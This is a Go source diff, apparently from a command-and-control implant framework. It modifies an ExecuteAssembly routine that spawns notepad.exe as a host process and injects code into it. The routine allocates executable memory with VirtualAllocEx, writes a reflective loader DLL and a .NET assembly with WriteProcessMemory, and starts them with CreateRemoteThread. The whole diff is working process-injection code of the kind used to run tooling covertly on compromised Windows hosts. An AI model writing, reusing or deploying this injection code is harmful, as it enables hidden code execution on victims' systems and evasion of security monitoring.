@@ -4,8 +4,10 @@ import (
 	"bytes"
 	"fmt"
 	"io"
+	"os"
 	"os/exec"
 	"syscall"
+	"time"
 	"unsafe"
 
 	// {{if .Debug}}
@@ -138,10 +140,9 @@ func LocalTask(data []byte) error {
 	return err
 }
 
-func ExecuteAssembly(hostingDll, assembly []byte, params string) (string, error) {
-
+func ExecuteAssembly(hostingDll, assembly []byte, params string, timeout int32) (string, error) {
 	if len(assembly) > MAX_ASSEMBLY_LENGTH {
-		return fmt.Errorf("please use an assembly smaller than %d", MAX_ASSEMBLY_LENGTH)
+		return "", fmt.Errorf("please use an assembly smaller than %d", MAX_ASSEMBLY_LENGTH)
 	}
 	cmd := exec.Command("notepad.exe")
 	cmd.SysProcAttr = &syscall.SysProcAttr{
@@ -152,31 +153,39 @@ func ExecuteAssembly(hostingDll, assembly []byte, params string) (string, error)
 	stderrIn, _ := cmd.StderrPipe()
 
 	var errStdout, errStderr error
-	cmd.Start()
+	stdout := io.MultiWriter(os.Stdout, &stdoutBuf)
+	stderr := io.MultiWriter(os.Stderr, &stderrBuf)
+	go cmd.Run()
+	time.Sleep(time.Second * 3)
 	pid := cmd.Process.Pid
+	log.Println("[*] Process started, pid =", cmd.Process.Pid)
 	// OpenProcess with PROC_ACCESS_ALL
 	handle, err := syscall.OpenProcess(PROCESS_ALL_ACCESS, true, uint32(pid))
 	if err != nil {
 		return "", err
 	}
+	log.Println("[*] Allocating space for reflective DLL")
 	// VirtualAllocEx to allocate a new memory segment into the target process
-	hostingDllAddr, err := virtualAllocEx(handle, 0, uint32(len(hostingDll)), MEM_COMMIT|MEM_RESERVE, syscall.PAGE_EXECUTE_READWRITE)
-	if err != nil {
+	dllSize := len(hostingDll)
+	hostingDllAddr, _, err := virtualAllocEx.Call(uintptr(handle), 0, ptr(dllSize), MEM_COMMIT, syscall.PAGE_EXECUTE_READWRITE)
+	if hostingDllAddr == 0 {
+		log.Println("VirtualAllocEx failed")
 		return "", err
 	}
+	log.Println("[*] Calling WriteProcessMemory...")
 	// WriteProcessMemory to write the reflective loader into the process
-	_, err = writeProcessMemory(handle, hostingDllAddr, unsafe.Pointer(&hostingDll[0]), uint32(len(hostingDll)))
-	if err != nil {
+	success, _, err := writeProcessMemory.Call(uintptr(handle), uintptr(hostingDllAddr), uintptr(unsafe.Pointer(&hostingDll[0])), ptr(dllSize))
+	if success == 0 {
+		log.Println("WriteProcessMemory failed")
 		return "", err
 	}
-	// {{if .Debug}}
 	log.Printf("[*] Hosting DLL reflectively injected at 0x%08x\n", hostingDllAddr)
-	// {{end}}
 	// Total size to allocate = assembly size + 1024 bytes for the args
-	totalSize := uint32(MAX_ASSEMBLY_LENGTH)
+	totalSize := int(MAX_ASSEMBLY_LENGTH)
 	// VirtualAllocEx to allocate another memory segment for hosting the .NET assembly and args
-	assemblyAddr, err := virtualAllocEx(handle, 0, totalSize, MEM_COMMIT|MEM_RESERVE, syscall.PAGE_READWRITE)
-	if err != nil {
+	assemblyAddr, _, err := virtualAllocEx.Call(uintptr(handle), 0, ptr(totalSize), MEM_COMMIT, syscall.PAGE_READWRITE)
+	if assemblyAddr == 0 {
+		log.Println("VirtualAllocEx failed")
 		return "", err
 	}
 	// Padd arguments with 0x00 -- there must be a cleaner way to do that
@@ -185,34 +194,33 @@ func ExecuteAssembly(hostingDll, assembly []byte, params string) (string, error)
 	final := append(paramsBytes, padding...)
 	// Final payload: params + assembly
 	final = append(final, assembly...)
+	finalSize := len(final)
 	// WriteProcessMemory to write the .NET assembly + args
-	_, err = writeProcessMemory(handle, assemblyAddr, unsafe.Pointer(&final[0]), uint32(len(final)))
-	if err != nil {
+	success, _, err = writeProcessMemory.Call(uintptr(handle), uintptr(assemblyAddr), uintptr(unsafe.Pointer(&final[0])), ptr(finalSize))
+	if success == 0 {
 		return "", err
 	}
-	// {{if .Debug}}
 	log.Printf("[*] Wrote %d bytes at 0x%08x\n", len(final), assemblyAddr)
-	// {{end}}
 	// CreateRemoteThread(DLL addr + offset, assembly addr)
-	attr := new(syscall.SecurityAttributes)
-	_, _, err = createRemoteThread(handle, attr, 0, uintptr(hostingDllAddr+BobLoaderOffset), uintptr(assemblyAddr), 0)
-	if err != nil {
+	success, _, err = createRemoteThread.Call(uintptr(handle), 0, 0, uintptr(hostingDllAddr+BobLoaderOffset), uintptr(assemblyAddr), 0)
+	if success == 0 {
 		return "", err
 	}
 
 	go func() {
-		_, errStdout = io.Copy(&stdoutBuf, stdoutIn)
+		_, errStdout = io.Copy(stdout, stdoutIn)
 	}()
-	_, errStderr = io.Copy(&stderrBuf, stderrIn)
+	_, errStderr = io.Copy(stderr, stderrIn)
 
 	if errStdout != nil || errStderr != nil {
-		// {{if .Debug}}
 		log.Fatal("failed to capture stdout or stderr\n")
-		// {{end}}
 	}
+	log.Printf("Sleeping for %d seconds\n", timeout-20)
+	time.Sleep(time.Second * time.Duration(timeout-20))
 	outStr, errStr := string(stdoutBuf.Bytes()), string(stderrBuf.Bytes())
 	if len(errStr) > 1 {
 		return "", fmt.Errorf(errStr)
 	}
+	log.Println("EXECUTE ASSEMBLY FINISHED", outStr)
 	return outStr, nil
 }
